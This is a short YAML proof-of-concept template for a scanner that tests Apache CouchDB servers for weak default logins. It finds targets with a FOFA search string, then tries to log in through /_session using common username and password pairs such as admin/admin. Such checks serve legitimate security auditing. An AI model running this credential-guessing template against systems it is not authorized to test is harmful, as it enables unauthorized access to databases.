id: poc-yaml-couchdb-weak-password
info:
  name: CouchDB 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: couchdb
  fofa: app="APACHE-CouchDB"
variables:
  user: 'admin

    administrator

    couchdb

    root

    '
  passwd: 'admin

    test

    couchdb

    password

    '
firstRequest:
  method: GET
  path: /
  expression: contains(body,"\"couchdb\":")
requests:
- method: POST
  path: /_session
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: name={{.user}}&password={{.passwd}}
  expression: status_code == 200 && contains(body,`{"ok":true`) && contains(body,`"name":"`)
    && contains(body,`"roles":[`) && contains(headers,"AuthSession=")
transport: http
